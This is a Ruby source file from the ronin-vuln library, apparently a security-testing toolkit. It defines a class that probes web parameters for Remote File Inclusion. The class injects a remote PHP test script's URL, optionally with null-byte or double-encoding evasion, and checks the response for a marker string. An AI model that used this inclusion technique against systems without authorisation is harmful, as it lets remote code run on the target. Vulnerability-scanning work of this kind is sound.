#
# ronin-vuln - A Ruby library for blind vulnerability testing.
#
# Copyright (c) 2022 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-vuln is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-vuln is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-vuln.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/vuln/web'

require 'ronin/support/network/http'
require 'uri/query_params'

module Ronin
  module Vuln
    #
    # Represents a Remote File Inclusion (RFI) vulnerability.
    #
    class RFI < Web

      # Default URL of the Remote File Inclusion (RFI) Test script.
      TEST_SCRIPT_URL = 'https://raw.githubusercontent.com/ronin-rb/ronin-vuln/main/data/rfi_test.php'

      # The string that will be returned if the Remote File Inclusion (RFI)
      # script is executed.
      VULN_RESPONSE_STRING = "Remote File Inclusion (RFI) Detected: eval(\"1 + 1\") = 2"

      # The evasion technique to use.
      #
      # @return [nil, :null_byte, :double_encode]
      attr_reader :evasion

      # URL of the Remote File Inclusion (RFI) Test script
      # 
      # @return [URI::HTTP, String]
      attr_reader :test_script_url

      #
      # Creates a new Remote File Inclusion (RFI) object.
      #
      # @param [String, URI::HTTP] url
      #   The URL to attempt to exploit.
      #
      # @param [:null_byte, :double_encode, nil] evasion
      #   Specifies which evasion technique to use.
      #   * `:null_byte` - will cause the inclusion URL to be appended with a
      #     `%00` character.
      #   * `:double_encode` - will cause the inclusion URL to be URI escaped
      #     twice.
      #
      # @param [String, URI::HTTP] test_script_url
      #   The URL of the RFI test script.
      #
      def initialize(url, test_script_url: self.class.test_script_url,
                          evasion:         nil,
                          **kwargs)
        super(url,**kwargs)

        @test_script_url = test_script_url
        @evasion         = evasion
      end

      #
      # Specifies the URL to the Remote File Inclusion (RFI) testing script.
      #
      # @return [String]
      #   The URL to the RFI testing script.
      #
      def self.test_script_url
        @test_script_url ||= TEST_SCRIPT_URL
      end

      #
      # Uses a new URL for the Remote File Inclusion (RFI) testing script.
      #
      # @param [String] new_url
      #   The new URL to the RFI testing script.
      #
      # @return [String]
      #   The new URL to the RFI testing script.
      #
      def self.test_script_url=(new_url)
        @test_script_url = new_url
      end

      #
      # Optionally applies evasion to the RFI URL.
      #
      # @param [URI::HTTP, String] url
      #   The RFI URL to optionall encode before it will be injected into a
      #   HTTP request.
      #
      # @return [String]
      #   The optionally encoded RFI URL.
      #
      def encode_payload(url)
        url = url.to_s

        case @evasion
        when :null_byte
          # Optionally append a null-byte
          # NOTE: uri-query_params will automatically URI encode the null byte
          url = "#{url}\0"
        when :double_encode
          # Optionally double URI encodes the script URL
          url = URI::QueryParams.escape(url)
        end

        return url
      end

      #
      # Performs a Remote File Inclusion (RFI) using the given remote URL.
      #
      # @param [URI::HTTP, String] rfi_url
      #   The remote URL to include into the page.
      #
      # @return [Net::HTTPResponse]
      #   The HTTP response from the RFI request.
      #
      def exploit(rfi_url,**kwargs)
        super(encode_payload(rfi_url),**kwargs)
      end

      #
      # Tests whether the URL and query parameter are vulnerable to Remote File
      # Inclusion (RFI).
      #
      # @return [Boolean]
      #   Specifies whether the URL and query parameter are vulnerable to RFI.
      #
      def vulnerable?
        response = exploit(@test_script_url)
        body     = response.body

        return body.include?(VULN_RESPONSE_STRING)
      end

    end
  end
end
